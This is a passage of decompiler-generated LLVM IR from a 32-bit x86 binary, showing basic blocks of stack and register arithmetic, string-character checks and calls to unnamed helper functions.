  %v0_8049dba = load i32, i32* @edi, align 4
  %v2_8049dba = add i32 %v0_8049dac, 4
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 %v0_8049dba, i32* %v3_8049dba, align 4
  %v1_8049dbb = add i32 %v0_8049dac, 108
  %v2_8049dbb = inttoptr i32 %v1_8049dbb to i32*
  %v3_8049dbb = load i32, i32* %v2_8049dbb, align 4
  store i32 %v3_8049dbb, i32* %edx.global-to-local, align 4
  %v1_8049dbf = add i32 %v3_8049dbb, 16
  %v2_8049dbf = inttoptr i32 %v1_8049dbf to i32*
  %v3_8049dbf = load i32, i32* %v2_8049dbf, align 4
  %v2_8049dc2 = mul i32 %v3_8049dbf, 128
  %v3_8049dc2 = icmp eq i32 %v2_8049dc2, 0
  store i1 %v3_8049dc2, i1* %zf.global-to-local, align 1
  %v0_8049dc5 = load i32, i32* @ebp, align 4
  %v2_8049dc5 = add i32 %v0_8049dc5, %v2_8049dc2
  store i32 %v2_8049dc5, i32* %eax.global-to-local, align 4
  %v3_8049dc9 = inttoptr i32 %v0_8049dac to i32*
  store i32 %v2_8049dc5, i32* %v3_8049dc9, align 4
  %v3_8049dca = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049dca, i32* %eax.global-to-local, align 4
  %v0_8049dcf = load i32, i32* @esp, align 4
  %v1_8049dcf = add i32 %v0_8049dcf, 108
  %v2_8049dcf = inttoptr i32 %v1_8049dcf to i32*
  %v3_8049dcf = load i32, i32* %v2_8049dcf, align 4
  store i32 %v3_8049dcf, i32* %ecx.global-to-local, align 4
  %v1_8049dd3 = add i32 %v3_8049dcf, 16
  %v2_8049dd3 = inttoptr i32 %v1_8049dd3 to i32*
  %v3_8049dd3 = load i32, i32* %v2_8049dd3, align 4
  %v2_8049dd6 = mul i32 %v3_8049dd3, 128
  %v3_8049dd6 = icmp eq i32 %v2_8049dd6, 0
  store i1 %v3_8049dd6, i1* %zf.global-to-local, align 1
  %v0_8049dd9 = load i32, i32* @ebp, align 4
  %v2_8049dd9 = add i32 %v0_8049dd9, %v2_8049dd6
  store i32 %v2_8049dd9, i32* %ebx.global-to-local, align 4
  %v2_8049ddd = inttoptr i32 %v0_8049dcf to i32*
  store i32 %v2_8049dd9, i32* %v2_8049ddd, align 4
  %v2_8049de0 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049de0, i32* %eax.global-to-local, align 4
  %v0_8049de5 = load i32, i32* @esp, align 4
  %v1_8049de5 = inttoptr i32 %v0_8049de5 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  store i32 %v2_8049de5, i32* %ecx.global-to-local, align 4
  %v3_8049de5 = add i32 %v0_8049de5, 4
  %v0_8049de6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049de6 = add i32 %v0_8049de6, %v2_8049de0
  %v12_8049de6 = icmp eq i32 %v2_8049de6, 0
  store i1 %v12_8049de6, i1* %zf.global-to-local, align 1
  store i32 %v2_8049de6, i32* @ebx, align 4
  %v1_8049de8 = inttoptr i32 %v3_8049de5 to i32*
  store i32 ptrtoint (i32* @global_var_8052493.19 to i32), i32* %v1_8049de8, align 4
  %v0_8049dee = load i32, i32* @ebx, align 4
  store i32 %v0_8049dee, i32* %v1_8049de5, align 4
  %v3_8049def = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049def, i32* %eax.global-to-local, align 4
  %v0_8049df4 = load i32, i32* @esp, align 4
  %v1_8049df4 = add i32 %v0_8049df4, 56
  %v2_8049df4 = inttoptr i32 %v1_8049df4 to i32*
  %v3_8049df4 = load i32, i32* %v2_8049df4, align 4
  store i32 %v3_8049df4, i32* %ebx.global-to-local, align 4
  %v1_8049df8 = add i32 %v0_8049df4, -4
  %v2_8049df8 = inttoptr i32 %v1_8049df8 to i32*
  store i32 1, i32* %v2_8049df8, align 4
  %v1_8049dfa = add i32 %v0_8049df4, -8
  %v2_8049dfa = inttoptr i32 %v1_8049dfa to i32*
  store i32 ptrtoint (i32* @global_var_805249a.16 to i32), i32* %v2_8049dfa, align 4
  %v1_8049dff = add i32 %v0_8049df4, 108
  %v2_8049dff = inttoptr i32 %v1_8049dff to i32*
  %v3_8049dff = load i32, i32* %v2_8049dff, align 4
  store i32 %v3_8049dff, i32* %edx.global-to-local, align 4
  %v0_8049e03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e03 = add i32 %v0_8049e03, 3
  store i32 %v1_8049e03, i32* @ebx, align 4
  %v0_8049e06 = load i32, i32* @esi, align 4
  %v2_8049e06 = add i32 %v0_8049e06, %v1_8049e03
  store i32 %v2_8049e06, i32* @esi, align 4
  %v1_8049e08 = add i32 %v3_8049dff, 660
  %v2_8049e08 = inttoptr i32 %v1_8049e08 to i32*
  %v3_8049e08 = load i32, i32* %v2_8049e08, align 4
  %v2_8049e0e = sub i32 %v3_8049e08, %v1_8049e03
  %v12_8049e0e = icmp eq i32 %v2_8049e0e, 0
  store i1 %v12_8049e0e, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e0e, i32* %eax.global-to-local, align 4
  %v2_8049e10 = add i32 %v0_8049df4, -12
  %v3_8049e10 = inttoptr i32 %v2_8049e10 to i32*
  store i32 %v2_8049e0e, i32* %v3_8049e10, align 4
  %v0_8049e11 = load i32, i32* @esi, align 4
  %v2_8049e11 = add i32 %v0_8049df4, -16
  %v3_8049e11 = inttoptr i32 %v2_8049e11 to i32*
  store i32 %v0_8049e11, i32* %v3_8049e11, align 4
  %v0_8049e12 = call i32 @function_804f660()
  store i32 %v0_8049e12, i32* %eax.global-to-local, align 4
  %v0_8049e17 = load i32, i32* @esp, align 4
  %v1_8049e17 = add i32 %v0_8049e17, 108
  %v2_8049e17 = inttoptr i32 %v1_8049e17 to i32*
  %v3_8049e17 = load i32, i32* %v2_8049e17, align 4
  store i32 %v3_8049e17, i32* %edx.global-to-local, align 4
  %v0_8049e1b = load i32, i32* @ebx, align 4
  %v2_8049e1b = add i32 %v0_8049e1b, %v3_8049e17
  store i32 %v2_8049e1b, i32* %ebx.global-to-local, align 4
  %v2_8049e1d = add i32 %v0_8049e12, 2115
  %v3_8049e1d = add i32 %v2_8049e1d, %v2_8049e1b
  %v4_8049e1d = inttoptr i32 %v3_8049e1d to i8*
  store i8 0, i8* %v4_8049e1d, align 1
  %v0_8049e25 = load i32, i32* @esp, align 4
  %v1_8049e25 = add i32 %v0_8049e25, 124
  %v2_8049e25 = inttoptr i32 %v1_8049e25 to i32*
  %v3_8049e25 = load i32, i32* %v2_8049e25, align 4
  store i32 %v3_8049e25, i32* %ecx.global-to-local, align 4
  %v1_8049e2c = add i32 %v3_8049e25, 16
  %v2_8049e2c = inttoptr i32 %v1_8049e2c to i32*
  %v3_8049e2c = load i32, i32* %v2_8049e2c, align 4
  %v2_8049e2f = mul i32 %v3_8049e2c, 128
  %v3_8049e2f = icmp eq i32 %v2_8049e2f, 0
  store i1 %v3_8049e2f, i1* %zf.global-to-local, align 1
  %v0_8049e32 = load i32, i32* @ebp, align 4
  %v2_8049e32 = add i32 %v0_8049e32, %v2_8049e2f
  store i32 %v2_8049e32, i32* %ebx.global-to-local, align 4
  %v2_8049e36 = add i32 %v0_8049e25, 16
  %v3_8049e36 = inttoptr i32 %v2_8049e36 to i32*
  store i32 %v2_8049e32, i32* %v3_8049e36, align 4
  %v2_8049e37 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049e37, i32* %eax.global-to-local, align 4
  %v0_8049e3c = load i32, i32* @esp, align 4
  %v1_8049e3c = inttoptr i32 %v0_8049e3c to i32*
  %v2_8049e3c = load i32, i32* %v1_8049e3c, align 4
  store i32 %v2_8049e3c, i32* %ecx.global-to-local, align 4
  %v3_8049e3c = add i32 %v0_8049e3c, 4
  %v0_8049e3d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049e3d = add i32 %v0_8049e3d, %v2_8049e37
  %v12_8049e3d = icmp eq i32 %v2_8049e3d, 0
  store i1 %v12_8049e3d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e3d, i32* @ebx, align 4
  %v1_8049e3f = inttoptr i32 %v3_8049e3c to i32*
  %v2_8049e3f = load i32, i32* %v1_8049e3f, align 4
  store i32 %v2_8049e3f, i32* @edi, align 4
  %v0_8049e40 = load i32, i32* @esi, align 4
  store i32 %v0_8049e40, i32* %v1_8049e3f, align 4
  %v0_8049e41 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e41, i32* %v1_8049e3c, align 4
  %v3_8049e42 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049e42, i32* %eax.global-to-local, align 4
  %v0_8049e47 = load i32, i32* @esp, align 4
  %v1_8049e47 = add i32 %v0_8049e47, 108
  %v2_8049e47 = inttoptr i32 %v1_8049e47 to i32*
  %v3_8049e47 = load i32, i32* %v2_8049e47, align 4
  store i32 %v3_8049e47, i32* %eax.global-to-local, align 4
  %v1_8049e4b = add i32 %v3_8049e47, 16
  %v2_8049e4b = inttoptr i32 %v1_8049e4b to i32*
  %v3_8049e4b = load i32, i32* %v2_8049e4b, align 4
  %v1_8049e51 = add i32 %v3_8049e4b, 1
  %v8_8049e51 = icmp eq i32 %v1_8049e51, 0
  store i1 %v8_8049e51, i1* %zf.global-to-local, align 1
  store i32 %v1_8049e51, i32* %edx.global-to-local, align 4
  store i32 %v1_8049e51, i32* %v2_8049e4b, align 4
  %v0_80496c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80496c3

dec_label_pc_8049e5a:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %eax.global-to-local, align 4
  %v1_8049e5e = add i32 %v3_8049e5a, -1448
  %v2_8049e5e = inttoptr i32 %v1_8049e5e to i8*
  store i8 1, i8* %v2_8049e5e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049a11
  %v1_8049e6a = add i32 %v0_8049a34, 20916
  %v2_8049e6a = inttoptr i32 %v1_8049e6a to i32*
  store i32 7, i32* %v2_8049e6a, align 4
  %v0_8049e75 = load i32, i32* @ebx, align 4
  %v1_8049e75 = add i32 %v0_8049e75, 4
  %v2_8049e75 = inttoptr i32 %v1_8049e75 to i8*
  %v3_8049e75 = load i8, i8* %v2_8049e75, align 1
  %v12_8049e75 = icmp eq i8 %v3_8049e75, 115
  store i1 %v12_8049e75, i1* %zf.global-to-local, align 1
  %v1_8049e79 = icmp eq i1 %v12_8049e75, false
  br i1 %v1_8049e79, label %dec_label_pc_8049e86, label %dec_label_pc_8049e7b

dec_label_pc_8049e7b:                             ; preds = %dec_label_pc_8049e6a
  %v0_8049e7b = load i32, i32* @esp, align 4
  %v1_8049e7b = add i32 %v0_8049e7b, 20900
  %v2_8049e7b = inttoptr i32 %v1_8049e7b to i32*
  store i32 8, i32* %v2_8049e7b, align 4
  br label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e7b
  %v0_8049e86 = load i32, i32* @esp, align 4
  %v1_8049e86 = add i32 %v0_8049e86, 20900
  %v2_8049e86 = inttoptr i32 %v1_8049e86 to i32*
  %v3_8049e86 = load i32, i32* %v2_8049e86, align 4
  store i32 %v3_8049e86, i32* %edx.global-to-local, align 4
  %v2_8049e8d = add i32 %v0_8049e86, -4
  %v3_8049e8d = inttoptr i32 %v2_8049e8d to i32*
  store i32 4, i32* %v3_8049e8d, align 4
  %v0_8049e8e = load i32, i32* @edi, align 4
  %v1_8049e8e = add i32 %v0_8049e8e, 1
  %v1_8049e91 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e91 = sub i32 %v1_8049e8e, %v1_8049e91
  %v12_8049e91 = icmp eq i32 %v2_8049e91, 0
  store i1 %v12_8049e91, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e91, i32* %eax.global-to-local, align 4
  %v0_8049e93 = load i32, i32* @ebx, align 4
  %v2_8049e93 = add i32 %v0_8049e93, %v1_8049e91
  store i32 %v2_8049e93, i32* %edx.global-to-local, align 4
  %v2_8049e96 = add i32 %v0_8049e86, -8
  %v3_8049e96 = inttoptr i32 %v2_8049e96 to i32*
  store i32 %v2_8049e91, i32* %v3_8049e96, align 4
  %v0_8049e97 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e97 = add i32 %v0_8049e86, -12
  %v3_8049e97 = inttoptr i32 %v2_8049e97 to i32*
  store i32 %v0_8049e97, i32* %v3_8049e97, align 4
  %v0_8049e98 = load i32, i32* @ebx, align 4
  %v2_8049e98 = add i32 %v0_8049e86, -16
  %v3_8049e98 = inttoptr i32 %v2_8049e98 to i32*
  store i32 %v0_8049e98, i32* %v3_8049e98, align 4
  %v4_8049e99 = call i32 @function_80500b3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e99, i32* %eax.global-to-local, align 4
  %v0_8049e9e = load i32, i32* @esp, align 4
  %v1_8049e9e = add i32 %v0_8049e9e, 20916
  %v2_8049e9e = inttoptr i32 %v1_8049e9e to i32*
  store i32 0, i32* %v2_8049e9e, align 4
  %v0_8049ea9 = load i32, i32* @esp, align 4
  %v6_8049ea9 = icmp eq i32 %v0_8049ea9, -16
  store i1 %v6_8049ea9, i1* %zf.global-to-local, align 1
  %v0_8049eac = load i32, i32* @ebx, align 4
  %v1_8049eac = inttoptr i32 %v0_8049eac to i8*
  %v2_8049eac = load i8, i8* %v1_8049eac, align 1
  %v3_8049eac = zext i8 %v2_8049eac to i32
  %v5_8049eac = and i32 %v4_8049e99, -256
  %v6_8049eac = or i32 %v3_8049eac, %v5_8049eac
  store i32 %v6_8049eac, i32* %eax.global-to-local, align 4
  %v4_8049eae = icmp eq i8 %v2_8049eac, 0
  store i1 %v4_8049eae, i1* %zf.global-to-local, align 1
  br i1 %v4_8049eae, label %dec_label_pc_8049ce8, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e86
  store i32 %v0_8049eac, i32* %ecx.global-to-local, align 4
  %v10_8049eb8 = icmp eq i8 %v2_8049eac, 47
  store i1 %v10_8049eb8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049eb8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec0

dec_label_pc_8049ec0:                             ; preds = %dec_label_pc_8049eb6
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049ed1195 = add i32 %v0_8049eac, 1
  store i32 %v2_8049ed1195, i32* %ecx.global-to-local, align 4
  %v2_8049ed4196 = add i32 %v0_8049ea9, 20916
  %v3_8049ed4197 = inttoptr i32 %v2_8049ed4196 to i32*
  store i32 1, i32* %v3_8049ed4197, align 4
  %v0_8049edb198 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb199 = inttoptr i32 %v0_8049edb198 to i8*
  %v2_8049edb200 = load i8, i8* %v1_8049edb199, align 1
  %v3_8049edb201 = zext i8 %v2_8049edb200 to i32
  %v4_8049edb202 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb203 = and i32 %v4_8049edb202, -256
  %v6_8049edb204 = or i32 %v5_8049edb203, %v3_8049edb201
  store i32 %v6_8049edb204, i32* %edx.global-to-local, align 4
  %v4_8049edd205 = icmp eq i8 %v2_8049edb200, 0
  store i1 %v4_8049edd205, i1* %zf.global-to-local, align 1
  %v1_8049edf206 = icmp eq i1 %v4_8049edd205, false
  br i1 %v1_8049edf206, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ec7:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge
  %v2_8049edb208 = phi i8 [ %v2_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v2_8049edb200, %dec_label_pc_8049ec0 ]
  %v0_8049edb207 = phi i32 [ %v0_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v0_8049edb198, %dec_label_pc_8049ec0 ]
  %v0_8049ec7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ec7 = add i32 %v0_8049ec7, 1
  store i32 %v1_8049ec7, i32* %eax.global-to-local, align 4
  %v10_8049ec8 = icmp eq i8 %v2_8049edb208, 47
  store i1 %v10_8049ec8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049ec8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge

dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge: ; preds = %dec_label_pc_8049ec7
  %v0_8049ed1.pre = load i32, i32* @ebx, align 4
  %v1_8049ed4.pre = load i32, i32* @esp, align 4
  %v2_8049ed1 = add i32 %v0_8049ed1.pre, %v1_8049ec7
  store i32 %v2_8049ed1, i32* %ecx.global-to-local, align 4
  %v2_8049ed4 = add i32 %v1_8049ed4.pre, 20900
  %v3_8049ed4 = inttoptr i32 %v2_8049ed4 to i32*
  store i32 %v1_8049ec7, i32* %v3_8049ed4, align 4
  %v0_8049edb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb = inttoptr i32 %v0_8049edb to i8*
  %v2_8049edb = load i8, i8* %v1_8049edb, align 1
  %v3_8049edb = zext i8 %v2_8049edb to i32
  %v4_8049edb = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb = and i32 %v4_8049edb, -256
  %v6_8049edb = or i32 %v5_8049edb, %v3_8049edb
  store i32 %v6_8049edb, i32* %edx.global-to-local, align 4
  %v4_8049edd = icmp eq i8 %v2_8049edb, 0
  store i1 %v4_8049edd, i1* %zf.global-to-local, align 1
  %v1_8049edf = icmp eq i1 %v4_8049edd, false
  br i1 %v1_8049edf, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ee6:                             ; preds = %dec_label_pc_8049930
  %v0_8049ee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ee6 = add i32 %v0_8049ee6, 2
  store i32 %v1_8049ee6, i32* %eax.global-to-local, align 4
  %v1_8049ee9 = load i32, i32* @esp, align 4
  %v2_8049ee9 = add i32 %v1_8049ee9, 20900
  %v3_8049ee9 = inttoptr i32 %v2_8049ee9 to i32*
  store i32 %v1_8049ee6, i32* %v3_8049ee9, align 4
  %v0_8049951.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804994e

dec_label_pc_8049ef5:                             ; preds = %dec_label_pc_80499c3
  %v1_8049ef5 = add i32 %v3_80499c3, 1
  store i32 %v1_8049ef5, i32* %ebx.global-to-local, align 4
  store i32 %v1_8049ef5, i32* %v2_80499c3, align 4
  %v0_8049eff = load i32, i32* @esp, align 4
  %v9_8049eff = icmp eq i32 %v0_8049eff, 12
  store i1 %v9_8049eff, i1* %zf.global-to-local, align 1
  %v0_8049f02 = load i32, i32* @esi, align 4
  %v1_8049f02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049f02 = add i32 %v1_8049f02, %v0_8049f02
  store i32 %v2_8049f02, i32* @ebx, align 4
  %v2_8049f05 = add i32 %v0_8049eff, -16
  %v3_8049f05 = inttoptr i32 %v2_8049f05 to i32*
  store i32 %v2_8049f02, i32* %v3_8049f05, align 4
  %v2_8049f06 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049f06, i32* %eax.global-to-local, align 4
  %v0_8049f0b = load i32, i32* @esp, align 4
  %v1_8049f0b = add i32 %v0_8049f0b, 16
  %v6_8049f0b = icmp eq i32 %v1_8049f0b, 0
  store i1 %v6_8049f0b, i1* %zf.global-to-local, align 1
  %v0_8049f0e = load i32, i32* @ebx, align 4
  %v2_8049f0e = add i32 %v2_8049f06, -1
  %v3_8049f0e = add i32 %v2_8049f0e, %v0_8049f0e
  %v4_8049f0e = inttoptr i32 %v3_8049f0e to i8*
  %v5_8049f0e = load i8, i8* %v4_8049f0e, align 1
  %v14_8049f0e = icmp eq i8 %v5_8049f0e, 34
  store i1 %v14_8049f0e, i1* %zf.global-to-local, align 1
  %v1_8049f13 = icmp eq i1 %v14_8049f0e, false
  br i1 %v1_8049f13, label %dec_label_pc_80499d4, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ef5
  %v1_8049f19 = add i32 %v0_8049f0b, 20916
  %v2_8049f19 = inttoptr i32 %v1_8049f19 to i32*
  %v3_8049f19 = load i32, i32* %v2_8049f19, align 4
  store i32 %v3_8049f19, i32* %eax.global-to-local, align 4
  %v0_8049f20 = load i32, i32* @esi, align 4
  %v2_8049f25 = add i32 %v0_8049f20, %v3_8049f19
  %v12_8049f25 = icmp eq i32 %v2_8049f25, 0
  store i1 %v12_8049f25, i1* %zf.global-to-local, align 1
  store i32 %v2_8049f25, i32* @ebx, align 4
  %v3_8049f27 = inttoptr i32 %v0_8049f0b to i32*
  store i32 %v2_8049f25, i32* %v3_8049f27, align 4
  %v2_8049f28 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049f28, i32* %eax.global-to-local, align 4
  %v0_8049f2d = load i32, i32* @esp, align 4
  %v6_8049f2d = icmp eq i32 %v0_8049f2d, -16
  store i1 %v6_8049f2d, i1* %zf.global-to-local, align 1
  %v0_8049f30 = load i32, i32* @ebx, align 4
  %v2_8049f30 = add i32 %v2_8049f28, -1
  %v3_8049f30 = add i32 %v2_8049f30, %v0_8049f30
  %v4_8049f30 = inttoptr i32 %v3_8049f30 to i8*
  store i8 0, i8* %v4_8049f30, align 1
  %v0_80499d4.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80499d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80499d4

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_804848a
  %v9_8049f3a = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049f3a, i1* %zf.global-to-local, align 1
  %v1_8049f3d = add i32 %v0_80484a0, -16
  %v2_8049f3d = inttoptr i32 %v1_8049f3d to i32*
  store i32 47, i32* %v2_8049f3d, align 4
  %v2_8049f3f = call i32 @function_804ec60(i8 %v1_8049f3f)
  store i32 %v2_8049f3f, i32* %eax.global-to-local, align 4
  %v0_8049f44 = load i32, i32* @esp, align 4
  %v1_8049f44 = inttoptr i32 %v0_8049f44 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f44, i32* @ebx, align 4
  %v3_8049f44 = add i32 %v0_8049f44, 4
  %v1_8049f45 = inttoptr i32 %v3_8049f44 to i32*
  store i32 0, i32* %v1_8049f45, align 4
  store i32 47, i32* %v1_8049f44, align 4
  %v3_8049f4a = call i32 @function_804ebb0(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049f4a, i32* %eax.global-to-local, align 4
  %v0_8049f4f = load i32, i32* @esp, align 4
  %v1_8049f4f = inttoptr i32 %v0_8049f4f to i32*
  %v2_8049f4f = load i32, i32* %v1_8049f4f, align 4
  store i32 %v2_8049f4f, i32* %edx.global-to-local, align 4
  %v3_8049f4f = add i32 %v0_8049f4f, 4
  %v1_8049f50 = inttoptr i32 %v3_8049f4f to i32*
  %v2_8049f50 = load i32, i32* %v1_8049f50, align 4
  store i32 %v2_8049f50, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049f4a, i32* %v1_8049f50, align 4
  %v0_8049f52 = load i32, i32* @esi, align 4
  %v1_8049f52 = add i32 %v0_8049f52, 20
  store i32 %v1_8049f52, i32* %eax.global-to-local, align 4
  store i32 %v1_8049f52, i32* %v1_8049f4f, align 4
  %v3_8049f56 = call i32 @function_804f5d0(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f56, i32* %eax.global-to-local, align 4
  %v0_8049f5b = load i32, i32* @esp, align 4
  %v1_8049f5b = inttoptr i32 %v0_8049f5b to i32*
  store i32 47, i32* %v1_8049f5b, align 4
  %v2_8049f62 = call i32 @function_804ebe0(i8 %v1_8049f3f)
  store i32 %v2_8049f62, i32* %eax.global-to-local, align 4
  %v0_8049f67 = load i32, i32* @esp, align 4
  %v1_8049f67 = add i32 %v0_8049f67, 16
  %v6_8049f67 = icmp eq i32 %v1_8049f67, 0
  store i1 %v6_8049f67, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049f6a:                             ; preds = %dec_label_pc_804848a, %dec_label_pc_804a062, %dec_label_pc_8049ff8, %dec_label_pc_8049fc3, %dec_label_pc_8049f3a
  %v1_8049f6a = phi i32 [ %v0_80484a0, %dec_label_pc_804848a ], [ %v1_804a08f, %dec_label_pc_804a062 ], [ %v1_804a025, %dec_label_pc_8049ff8 ], [ %v1_8049ff0, %dec_label_pc_8049fc3 ], [ %v1_8049f67, %dec_label_pc_8049f3a ]
  %v0_8049f6a = phi i32 [ %v2_80484ac, %dec_label_pc_804848a ], [ %v2_804a08a, %dec_label_pc_804a062 ], [ %v2_804a020, %dec_label_pc_8049ff8 ], [ %v2_8049feb, %dec_label_pc_8049fc3 ], [ %v2_8049f62, %dec_label_pc_8049f3a ]
  %v2_8049f6a = add i32 %v1_8049f6a, -4
  %v3_8049f6a = inttoptr i32 %v2_8049f6a to i32*
  store i32 %v0_8049f6a, i32* %v3_8049f6a, align 4
  %v0_8049f6b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f6b = add i32 %v1_8049f6a, -8
  %v3_8049f6b = inttoptr i32 %v2_8049f6b to i32*
  store i32 %v0_8049f6b, i32* %v3_8049f6b, align 4
  %v1_8049f6c = add i32 %v1_8049f6a, 64
  %v2_8049f6c = inttoptr i32 %v1_8049f6c to i32*
  %v3_8049f6c = load i32, i32* %v2_8049f6c, align 4
  store i32 %v3_8049f6c, i32* %eax.global-to-local, align 4
  %v0_8049f70 = load i32, i32* @ebp, align 4
  %v1_8049f70 = add i32 %v0_8049f70, 1
  store i32 %v1_8049f70, i32* @ebp, align 4
  %v2_8049f71 = add i32 %v1_8049f6a, -12
  %v3_8049f71 = inttoptr i32 %v2_8049f71 to i32*
  store i32 %v3_8049f6c, i32* %v3_8049f71, align 4
  %v0_8049f72 = load i32, i32* @esi, align 4
  %v1_8049f72 = add i32 %v0_8049f72, 3140
  %v9_8049f72 = icmp eq i32 %v1_8049f72, 0
  store i1 %v9_8049f72, i1* %zf.global-to-local, align 1
  store i32 %v1_8049f72, i32* @esi, align 4
  %v1_8049f78 = add i32 %v1_8049f6a, 36
  %v2_8049f78 = inttoptr i32 %v1_8049f78 to i32*
  %v3_8049f78 = load i32, i32* %v2_8049f78, align 4
  store i32 %v3_8049f78, i32* @edi, align 4
  %v2_8049f7c = add i32 %v1_8049f6a, -16
  %v3_8049f7c = inttoptr i32 %v2_8049f7c to i32*
  store i32 %v3_8049f78, i32* %v3_8049f7c, align 4
  %v3_8049f7d = call i32 @function_804f5d0(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f7d, i32* %eax.global-to-local, align 4
  %v0_8049f82 = load i32, i32* @esp, align 4
  %v1_8049f85 = add i32 %v0_8049f82, 128
  %v2_8049f85 = inttoptr i32 %v1_8049f85 to i32*
  %v3_8049f85 = load i32, i32* %v2_8049f85, align 4
  %v4_8049f85 = load i32, i32* @ebp, align 4
  %v15_8049f85 = icmp eq i32 %v3_8049f85, %v4_8049f85
  store i1 %v15_8049f85, i1* %zf.global-to-local, align 1
  %v1_8049f89 = icmp eq i1 %v15_8049f85, false
  br i1 %v1_8049f89, label %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, label %dec_label_pc_8049f8f

dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge: ; preds = %dec_label_pc_8049f6a
  %v0_80483a9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80483a7

dec_label_pc_8049f8f:                             ; preds = %dec_label_pc_8049f6a
  %v1_8049f8f = add i32 %v0_8049f82, 20756
  store i32 %v1_8049f8f, i32* %edx.global-to-local, align 4
  %v1_8049f96 = add i32 %v0_8049f82, 64
  %v2_8049f96 = inttoptr i32 %v1_8049f96 to i32*
  %v3_8049f96 = load i32, i32* %v2_8049f96, align 4
  store i32 %v3_8049f96, i32* %eax.global-to-local, align 4
  %v2_8049f9a = add i32 %v0_8049f82, 40
  %v3_8049f9a = inttoptr i32 %v2_8049f9a to i32*
  store i32 %v1_8049f8f, i32* %v3_8049f9a, align 4
  %v0_8049f9e = load i32, i32* @esp, align 4
  %v1_8049f9e = add i32 %v0_8049f9e, 48
  %v2_8049f9e = inttoptr i32 %v1_8049f9e to i32*
  %v3_8049f9e = load i32, i32* %v2_8049f9e, align 4
  %v1_8049fa2 = add i32 %v0_8049f9e, 20612
  store i32 %v1_8049fa2, i32* %ecx.global-to-local, align 4
  %v0_8049fa9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049fa9 = add i32 %v0_8049fa9, 16
  store i32 %v1_8049fa9, i32* %eax.global-to-local, align 4
  %v1_8049fac = add i32 %v3_8049f9e, 1452
  %v9_8049fac = icmp eq i32 %v1_8049fac, 0
  store i1 %v9_8049fac, i1* %zf.global-to-local, align 1
  store i32 %v1_8049fac, i32* %edx.global-to-local, align 4
  %v2_8049fb2 = add i32 %v0_8049f9e, 20
  %v3_8049fb2 = inttoptr i32 %v2_8049fb2 to i32*
  store i32 %v1_8049fa2, i32* %v3_8049fb2, align 4
  %v0_8049fb6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049fb6 = load i32, i32* @esp, align 4
  %v2_8049fb6 = add i32 %v1_8049fb6, 28
  %v3_8049fb6 = inttoptr i32 %v2_8049fb6 to i32*
